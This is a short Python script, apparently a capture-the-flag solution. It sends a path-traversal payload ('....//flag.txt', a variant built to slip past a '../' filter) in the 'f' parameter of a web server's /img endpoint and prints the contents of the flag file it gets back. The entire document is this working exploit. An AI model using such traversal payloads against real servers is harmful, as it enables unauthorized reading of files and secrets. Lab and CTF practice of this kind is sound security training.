import os
import requests

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 8000))

PATH = "....//flag.txt"

r = requests.get(f"http://{HOST}:{PORT}/img", params={"f": PATH})
print(r.text)

